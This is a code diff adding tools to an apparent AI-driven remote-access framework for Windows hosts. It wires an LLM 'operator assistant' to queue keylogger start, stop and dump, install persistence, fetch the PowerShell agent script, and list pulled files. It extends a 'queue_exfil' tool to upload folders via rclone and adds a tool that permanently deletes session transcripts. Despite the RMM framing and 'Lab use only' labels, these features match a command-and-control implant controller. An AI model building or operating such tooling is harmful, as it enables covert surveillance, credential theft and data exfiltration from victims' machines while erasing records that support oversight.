@@ -281,6 +281,128 @@ def tool_stop_persistent(client: RmmApiClient, session_ref: str) -> str:
     return tool_queue_command(client, session_ref, "__STOP__", cmd_type="oneshot")
 
 
+def _resolve_history_ref(client: RmmApiClient, session_ref: str) -> tuple[str | None, dict]:
+    """Resolve archived session id from UUID prefix, full id, or hostname."""
+    ref = (session_ref or "").strip()
+    if not ref:
+        return None, {"error": "session_ref required"}
+    code, data = client.get_history_session(ref)
+    if code == 200 and data.get("session"):
+        sid = data["session"].get("session_id") or ref
+        return sid, data["session"]
+    code, data = client.list_history()
+    if code != 200:
+        return None, {"error": "history_lookup_failed", "detail": data}
+    ref_upper = ref.upper()
+    for row in data.get("sessions", []):
+        sid = row.get("session_id", "")
+        if sid == ref or sid.startswith(ref):
+            return sid, row
+        host = (row.get("hostname") or "").upper()
+        if host == ref_upper or host.startswith(ref_upper):
+            return sid, row
+    return None, {"error": "history_not_found", "session_ref": ref}
+
+
+def tool_list_history(client: RmmApiClient) -> str:
+    code, data = client.list_history()
+    if code != 200:
+        return _json_result({"ok": False, "status": code, "data": data})
+    sessions = data.get("sessions", [])
+    return _json_result({"ok": True, "count": len(sessions), "sessions": sessions})
+
+
+def tool_get_history_session(client: RmmApiClient, session_ref: str) -> str:
+    sid, info = _resolve_history_ref(client, session_ref)
+    if not sid:
+        return _json_result({"ok": False, **info})
+    code, data = client.get_history_session(sid)
+    if code != 200:
+        return _json_result({"ok": False, "status": code, "data": data})
+    return _json_result({"ok": True, "session_id": sid, "session": data.get("session")})
+
+
+def tool_get_history_events(
+    client: RmmApiClient,
+    session_ref: str,
+    since: int = 0,
+    limit: int = 500,
+) -> str:
+    sid, info = _resolve_history_ref(client, session_ref)
+    if not sid:
+        return _json_result({"ok": False, **info})
+    code, data = client.get_history_events(sid, since=since, limit=limit)
+    if code != 200:
+        return _json_result({"ok": False, "status": code, "data": data})
+    return _json_result({
+        "ok": True,
+        "session_id": data.get("session_id") or sid,
+        "events": data.get("events", []),
+    })
+
+
+def tool_delete_history(client: RmmApiClient, session_ref: str) -> str:
+    sid, info = _resolve_history_ref(client, session_ref)
+    if not sid:
+        return _json_result({"ok": False, **info})
+    code, data = client.delete_history(sid)
+    return _json_result({
+        "ok": code == 200,
+        "status": code,
+        "session_id": sid,
+        "data": data,
+    })
+
+
+def tool_list_session_downloads(client: RmmApiClient, session_ref: str) -> str:
+    sid, _ = _resolve_session_id(client, session_ref)
+    if not sid:
+        return _json_result({"ok": False, "error": "session_not_found"})
+    code, data = client.list_session_downloads(sid)
+    if code != 200:
+        return _json_result({"ok": False, "status": code, "data": data})
+    downloads = data.get("downloads", [])
+    return _json_result({
+        "ok": True,
+        "session_id": data.get("session_id") or sid,
+        "count": len(downloads),
+        "downloads": downloads,
+    })
+
+
+def tool_get_agent_script(client: RmmApiClient) -> str:
+    code, data = client.get_agent_script()
+    if code != 200:
+        return _json_result({"ok": False, "status": code, "data": data})
+    content = data.get("content") or ""
+    return _json_result({
+        "ok": True,
+        "filename": data.get("filename", "client_rmm.ps1"),
+        "byte_length": len(content.encode("utf-8")),
+        "line_count": content.count("\n") + (1 if content else 0),
+        "content": content,
+    })
+
+
+def tool_queue_keylog(client: RmmApiClient, session_ref: str, action: str) -> str:
+    act = (action or "").strip().lower()
+    if act not in ("start", "stop", "dump"):
+        return _json_result({
+            "ok": False,
+            "error": "invalid_action",
+            "detail": "action must be start, stop, or dump",
+        })
+    return tool_queue_command(client, session_ref, f"__KEYLOG__ {act}", cmd_type="oneshot")
+
+
+def tool_install_persistence(client: RmmApiClient, session_ref: str) -> str:
+    return tool_queue_command(client, session_ref, "__INSTALL_PERSIST__", cmd_type="oneshot")
+
+
+def tool_remove_persistence(client: RmmApiClient, session_ref: str) -> str:
+    return tool_queue_command(client, session_ref, "__REMOVE_PERSIST__", cmd_type="oneshot")
+
+
 TOOL_HANDLERS = {
     "health": lambda c, a: tool_health(c),
     "list_sessions": lambda c, a: tool_list_sessions(c),
@@ -322,6 +444,17 @@ TOOL_HANDLERS = {
         c, a["session_ref"], a["command"]
     ),
     "stop_persistent": lambda c, a: tool_stop_persistent(c, a["session_ref"]),
+    "list_history": lambda c, a: tool_list_history(c),
+    "get_history_session": lambda c, a: tool_get_history_session(c, a["session_ref"]),
+    "get_history_events": lambda c, a: tool_get_history_events(
+        c, a["session_ref"], int(a.get("since", 0)), int(a.get("limit", 500))
+    ),
+    "delete_history": lambda c, a: tool_delete_history(c, a["session_ref"]),
+    "list_session_downloads": lambda c, a: tool_list_session_downloads(c, a["session_ref"]),
+    "get_agent_script": lambda c, a: tool_get_agent_script(c),
+    "queue_keylog": lambda c, a: tool_queue_keylog(c, a["session_ref"], a["action"]),
+    "install_persistence": lambda c, a: tool_install_persistence(c, a["session_ref"]),
+    "remove_persistence": lambda c, a: tool_remove_persistence(c, a["session_ref"]),
 }
 
 
@@ -470,7 +603,7 @@ OPENAI_TOOLS: list[dict] = [
         "type": "function",
         "function": {
             "name": "queue_exfil",
-            "description": "Queue upload of a remote agent file via rclone (agent-side; link in events).",
+            "description": "Queue upload of a remote agent file or folder via rclone (agent-side; link in events for files).",
             "parameters": {
                 "type": "object",
                 "properties": {
@@ -582,6 +715,116 @@ OPENAI_TOOLS: list[dict] = [
             },
         },
     },
+    {
+        "type": "function",
+        "function": {
+            "name": "list_history",
+            "description": "List archived (ended) session transcripts.",
+            "parameters": {"type": "object", "properties": {}},
+        },
+    },
+    {
+        "type": "function",
+        "function": {
+            "name": "get_history_session",
+            "description": "Get metadata for an archived session by id prefix, full id, or hostname.",
+            "parameters": {
+                "type": "object",
+                "properties": {"session_ref": {"type": "string"}},
+                "required": ["session_ref"],
+            },
+        },
+    },
+    {
+        "type": "function",
+        "function": {
+            "name": "get_history_events",
+            "description": "Fetch read-only event transcript for an archived session.",
+            "parameters": {
+                "type": "object",
+                "properties": {
+                    "session_ref": {"type": "string"},
+                    "since": {"type": "integer", "description": "Event id cursor"},
+                    "limit": {"type": "integer", "description": "Max events (default 500)"},
+                },
+                "required": ["session_ref"],
+            },
+        },
+    },
+    {
+        "type": "function",
+        "function": {
+            "name": "delete_history",
+            "description": "Permanently delete an archived session transcript from disk (ended sessions only).",
+            "parameters": {
+                "type": "object",
+                "properties": {"session_ref": {"type": "string"}},
+                "required": ["session_ref"],
+            },
+        },
+    },
+    {
+        "type": "function",
+        "function": {
+            "name": "list_session_downloads",
+            "description": "List files downloaded from the agent for a live session (artifact names and URLs).",
+            "parameters": {
+                "type": "object",
+                "properties": {"session_ref": {"type": "string"}},
+                "required": ["session_ref"],
+            },
+        },
+    },
+    {
+        "type": "function",
+        "function": {
+            "name": "get_agent_script",
+            "description": "Fetch the full client_rmm.ps1 agent script from the server (large payload).",
+            "parameters": {"type": "object", "properties": {}},
+        },
+    },
+    {
+        "type": "function",
+        "function": {
+            "name": "queue_keylog",
+            "description": "Queue keylogger start, stop, or dump on the agent (__KEYLOG__).",
+            "parameters": {
+                "type": "object",
+                "properties": {
+                    "session_ref": {"type": "string"},
+                    "action": {
+                        "type": "string",
+                        "enum": ["start", "stop", "dump"],
+                    },
+                },
+                "required": ["session_ref", "action"],
+            },
+        },
+    },
+    {
+        "type": "function",
+        "function": {
+            "name": "install_persistence",
+            "description": "Queue agent persistence install (__INSTALL_PERSIST__). Lab use only.",
+            "parameters": {
+                "type": "object",
+                "properties": {"session_ref": {"type": "string"}},
+                "required": ["session_ref"],
+            },
+        },
+    },
+    {
+        "type": "function",
+        "function": {
+            "name": "remove_persistence",
+            "description": "Queue agent persistence removal (__REMOVE_PERSIST__). Lab use only.",
+            "parameters": {
+                "type": "object",
+                "properties": {"session_ref": {"type": "string"}},
+                "required": ["session_ref"],
+            },
+        },
+    },
 ]
 
 SYSTEM_PROMPT = """You are an RMM (Remote Monitoring and Management) operator assistant.
@@ -590,7 +833,9 @@ You control Windows agents through the Minimal-RMM server API using the provided
 Guidelines:
 - Use list_sessions first if you do not know which host to target.
 - session_ref can be hostname, id prefix (first 8 chars), or full session UUID.
+- Use list_history / get_history_events for archived (killed) session transcripts.
 - Prefer exec_command when the user wants command output; use queue_command when beacon sleep is long.
+- list_session_downloads shows completed agent→server file pulls; queue_download starts a new pull.
 - Be concise; summarize command output for the user.
-- Destructive actions (kill_session) require clear user intent.
+- Destructive actions (kill_session, delete_history) require clear user intent.
 """
